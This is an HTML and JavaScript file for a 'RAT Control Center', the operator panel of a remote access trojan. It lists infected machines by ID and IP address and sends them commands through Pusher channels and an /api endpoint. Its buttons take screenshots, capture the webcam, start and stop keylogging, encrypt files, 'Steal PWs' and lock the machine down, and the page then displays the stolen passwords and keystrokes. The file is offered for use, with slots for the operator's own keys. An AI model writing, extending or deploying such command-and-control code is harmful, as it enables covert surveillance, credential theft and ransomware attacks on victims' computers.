<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RAT Control Center</title>
    <!-- Pusher JS Client -->
    <script src="https://js.pusher.com/7.0/pusher.min.js"></script>
    <style>
        body { font-family: 'Courier New', monospace; background: #0f0f0f; color: #0f0; margin: 0; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; display: grid; grid-template-columns: 1fr 3fr; gap: 20px; }
        .sidebar { background: #1a1a1a; padding: 20px; border-radius: 8px; height: 100vh; overflow-y: auto; }
        .main { background: #1a1a1a; padding: 20px; border-radius: 8px; }
        button { background: #0f0; color: #000; border: none; padding: 10px 20px; margin: 5px 0; cursor: pointer; font-weight: bold; width: 100%; margin-bottom: 10px; }
        button:hover { background: #00ff00; }
        .client-list { list-style: none; padding: 0; }
        .client-item { padding: 10px; border-bottom: 1px solid #333; cursor: pointer; }
        .client-item.active { background: #333; color: #fff; }
        #output { background: #000; padding: 10px; height: 300px; overflow-y: scroll; border: 1px solid #0f0; white-space: pre-wrap; word-wrap: break-word; }
        .hidden { display: none; }
        input { width: 90%; padding: 5px; background: #333; border: 1px solid #0f0; color: #fff; margin-bottom: 10px; }
        img { max-width: 100%; border: 1px solid #0f0; }
    </style>
</head>
<body>

<div class="container">
    <div class="sidebar">
        <h2>Connected Clients</h2>
        <ul id="client-list" class="client-list">
            <!-- Clients appear here -->
        </ul>
        <hr>
        <h3>Actions</h3>
        <button onclick="sendCmd('screenshot')">📷 Screenshot</button>
        <button onclick="sendCmd('webcam')">📷 Webcam</button>
        <button onclick="sendCmd('keylog_start')">⌨️ Start Keylog</button>
        <button onclick="sendCmd('keylog_stop')">⌨️ Stop Keylog</button>
        <button onclick="sendCmd('encrypt')">🔒 Encrypt Files</button>
        <button onclick="sendCmd('passwords')">🔑 Steal PWs</button>
        <button onclick="sendCmd('lockdown')" style="background: red; color: white;">🚫 Lockdown</button>
        
        <div id="view-panel" class="hidden" style="margin-top: 20px;">
            <h3 id="view-title">View</h3>
            <div id="view-content"></div>
            <button onclick="closeView()">Close View</button>
        </div>
    </div>

    <div class="main">
        <div id="log-area">
            <h2>System Logs</h2>
            <div id="output"></div>
        </div>
        
        <!-- Hidden View Areas -->
        <div id="screenshot-view" class="hidden">
            <h2>Screenshot</h2>
            <img id="screenshot-img" src="" alt="Screenshot">
        </div>
        
        <div id="passwords-view" class="hidden">
            <h2>Stolen Passwords</h2>
            <pre id="passwords-data" style="background: #000; padding: 10px; overflow: auto;"></pre>
        </div>
    </div>
</div>

<script>
    // --- CONFIG: Replace with YOUR Pusher Keys ---
    const pusher = new Pusher('YOUR_APP_KEY', {
        cluster: 'YOUR_CLUSTER',
        forceTLS: true
    });

    const channel = pusher.subscribe('rat-control');
    const output = document.getElementById('output');
    const clientList = document.getElementById('client-list');

    function log(msg) {
        const line = document.createElement('div');
        line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
        output.appendChild(line);
        output.scrollTop = output.scrollHeight;
    }

    // --- Handle Incoming Commands from Server (RAT) ---
    // The RAT will push data to these channels: rat_data_{client_id}
    channel.bind('client_connected', function(data) {
        log(`New client: ${data.id} from ${data.ip}`);
        const li = document.createElement('li');
        li.className = 'client-item';
        li.textContent = `ID: ${data.id} | IP: ${data.ip}`;
        li.onclick = () => selectClient(data.id);
        clientList.appendChild(li);
    });

    // This function is called when the client sends data back
    window.receiveData = function(clientId, data) {
        log(`[Response from ${clientId}] ${data.type}: ${data.content.substring(0, 50)}...`);
        
        if (data.type === 'screenshot') {
            document.getElementById('log-area').classList.add('hidden');
            document.getElementById('screenshot-view').classList.remove('hidden');
            document.getElementById('screenshot-img').src = `data:image/png;base64,${data.content}`;
        }
        
        if (data.type === 'passwords') {
            document.getElementById('log-area').classList.add('hidden');
            document.getElementById('passwords-view').classList.remove('hidden');
            document.getElementById('passwords-data').textContent = JSON.parse(data.content);
        }

        if (data.type === 'keylog') {
            log(`[KEYLOG ${clientId}] ${data.content}`);
        }
    };

    // --- Select Client ---
    let currentClientId = null;
    let clientChannel = null;

    function selectClient(id) {
        currentClientId = id;
        if (clientChannel) clientChannel.unbind_all();
        
        // Subscribe to specific client channel to receive their data
        clientChannel = pusher.subscribe(`client_${id}`);
        clientChannel.bind('client_response', function(data) {
            window.receiveData(id, data);
        });
        
        // Highlight UI
        document.querySelectorAll('.client-item').forEach(el => el.classList.remove('active'));
        event.target.classList.add('active');
    }

    // --- Send Commands ---
    function sendCmd(cmd) {
        if (!currentClientId) {
            alert("Select a client first!");
            return;
        }
        
        // Call Vercel API to send the command
        fetch('/api', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ clientId: currentClientId, cmd: cmd })
        })
        .then(response => response.json())
        .then(data => {
            log(`Command sent: ${cmd}`);
        })
        .catch(error => console.error('Error:', error));
    }

    function closeView() {
        document.getElementById('screenshot-view').classList.add('hidden');
        document.getElementById('passwords-view').classList.add('hidden');
        document.getElementById('log-area').classList.remove('hidden');
    }
</script>

</body>
</html>
